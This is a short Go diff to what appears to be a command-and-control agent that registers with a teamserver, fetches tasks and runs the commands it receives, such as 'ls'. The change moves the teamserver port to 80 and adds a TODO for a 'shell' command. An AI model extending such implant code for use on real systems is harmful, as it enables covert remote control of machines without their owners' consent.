@@ -10,7 +10,7 @@ import (
 
 var (
 	Teamserver    = "http://127.0.0.1"
-	Port          = "50050"
+	Port          = "80"
 	URL           string
 	RegisterAgent string
 	GetTask       string
@@ -136,7 +136,9 @@ func main() {
 		tasks := json_data["tasks"].([]interface{})
 		task := tasks[0].(map[string]interface{})
 		command := task["Command"].(string)
-		// command_id := task["CommandID"].(string)
+
+		// TODO: Split command and give flexibility for "shell" instruction
+
 		switch command {
 		case "ls":
 			fmt.Println("[*] Found 'ls', executing command")
